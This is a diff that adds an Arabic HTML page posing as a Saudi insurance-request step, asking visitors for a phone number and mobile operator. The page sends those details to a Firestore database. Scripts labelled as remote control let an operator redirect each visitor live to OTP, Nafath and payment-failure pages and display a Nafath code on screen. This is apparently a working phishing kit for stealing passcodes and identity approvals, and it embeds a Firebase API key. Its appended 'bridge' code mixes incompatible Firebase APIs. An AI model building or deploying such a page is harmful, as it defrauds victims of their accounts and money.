@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>استكمال بيانات الطلب</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <!-- خط عربي احترافي -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { background-color: #e8f5e9; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Cairo', sans-serif; }
+        .form-wrapper {
+            max-width: 500px;
+            width: 100%;
+            padding: 30px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+        }
+        .form-label { font-weight: bold; color: #198754; }
+        
+        /* تنسيق كروت شركات الاتصالات */
+        .operator-card {
+            border: 2px solid #f0f0f0;
+            border-radius: 12px;
+            padding: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease-in-out;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 110px;
+            background: #fff;
+        }
+        .operator-card:hover { border-color: #198754; transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        .operator-input:checked + .operator-card { border-color: #198754; background-color: #f1f8f5; box-shadow: 0 0 0 2px rgba(25, 135, 84, 0.1); }
+        .operator-input { display: none; }
+        .operator-logo { max-height: 45px; max-width: 90%; object-fit: contain; margin-bottom: 8px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="form-wrapper mx-auto">
+        <h3 class="text-center mb-4 text-success">تأكيد رقم هاتف مقدم الطلب</h3>
+        
+        <div class="alert alert-success bg-opacity-10 border-success text-success text-center mb-4" role="alert">
+            لمتابعة طلب وثيقة التأمين، يرجى إدخال رقم هاتف مقدم الطلب بشكل صحيح.
+        </div>
+
+        <form onsubmit="submitRequest(event)" class="needs-validation" novalidate>
+            
+            <!-- رقم الجوال -->
+            <div class="mb-3">
+                <label for="phoneNumber" class="form-label">رقم الجوال *</label>
+                <div class="input-group has-validation">
+                    <span class="input-group-text bg-white border-success text-success">+966</span>
+                    <input type="tel" class="form-control border-success" id="phoneNumber" placeholder="5xxxxxxxx" dir="ltr" oninput="forceEnglish(this)" maxlength="9" required pattern="\d{9,}">
+                    <div class="invalid-feedback">
+                        رقم الجوال يجب أن لا يقل عن 9 أرقام.
+                    </div>
+                </div>
+            </div>
+
+            <!-- مشغل الشبكة -->
+            <div class="mb-4">
+                <label for="networkOperator" class="form-label">مشغل شبكة الجوال *</label>
+                
+                <div class="row g-2">
+                    <div class="col-4">
+                        <input type="radio" name="networkOperator" id="op_stc" value="stc" class="operator-input" required>
+                        <label class="operator-card" for="op_stc">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b3/STC_Logo.svg" alt="STC" class="operator-logo">
+                            <small class="fw-bold">STC</small>
+                        </label>
+                    </div>
+                    <div class="col-4">
+                        <input type="radio" name="networkOperator" id="op_mobily" value="mobily" class="operator-input">
+                        <label class="operator-card" for="op_mobily">
+                            <img src="https://upload.wikimedia.org/wikipedia/en/e/e7/Mobily_Logo.svg" alt="Mobily" class="operator-logo">
+                            <small class="fw-bold">Mobily</small>
+                        </label>
+                    </div>
+                    <div class="col-4">
+                        <input type="radio" name="networkOperator" id="op_zain" value="zain" class="operator-input">
+                        <label class="operator-card" for="op_zain">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9d/Zain-logo.svg" alt="Zain" class="operator-logo">
+                            <small class="fw-bold">Zain</small>
+                        </label>
+                    </div>
+                </div>
+            </div>
+
+            <div class="d-grid">
+                <button type="submit" class="btn btn-success btn-lg">تسجيل</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+    async function submitRequest(event) {
+        event.preventDefault();
+        const form = event.target;
+        
+        if (!form.checkValidity()) {
+            event.stopPropagation();
+            form.classList.add('was-validated');
+        } else {
+            // الحصول على رقم الهاتف وتوجيه المستخدم لصفحة التحقق
+            const phone = document.getElementById('phoneNumber').value;
+            const operator = document.querySelector('input[name="networkOperator"]:checked')?.value || 'Unknown';
+            
+            if (window.saveOperator) {
+                await window.saveOperator(phone, operator);
+            }
+            
+            window.location.href = `mobile_verification.html?phone=${encodeURIComponent(phone)}`;
+        }
+    }
+</script>
+
+<!-- كود تحويل الأرقام -->
+<script>
+    function forceEnglish(el) {
+        el.value = el.value.replace(/[٠-٩]/g, d => "٠١٢٣٤٥٦٧٨٩".indexOf(d)).replace(/[^0-9]/g, '');
+    }
+</script>
+
+<!-- كود التحكم عن بعد -->
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getFirestore, doc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+    // ⚠️ استبدل بالبيانات الحقيقية
+    const firebaseConfig = {
+        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
+        authDomain: "tameen-658e9.firebaseapp.com",
+        projectId: "tameen-658e9",
+        storageBucket: "tameen-658e9.firebasestorage.app",
+        messagingSenderId: "292670676256",
+        appId: "1:292670676256:web:3624157751cd194efe4b45",
+        measurementId: "G-6P06T2H9FD"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const userId = localStorage.getItem('user_id');
+    
+    if (userId) {
+        updateDoc(doc(db, "requests", userId), { currentPage: 'استكمال الجوال' }).catch(err => console.log(err));
+        
+        window.saveOperator = async (ph, op) => {
+             await updateDoc(doc(db, "requests", userId), {
+                mobileNumberConfirmed: ph,
+                networkOperator: op
+            });
+        };
+
+        onSnapshot(doc(db, "requests", userId), (snapshot) => {
+            const data = snapshot.data();
+            if (data && data.redirectCommand) {
+                if (!window.location.href.includes(data.redirectCommand)) {
+                    window.location.href = data.redirectCommand;
+                }
+            }
+        });
+    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_faild.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
+                }
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
+</script>
+
+</body>
+</html>
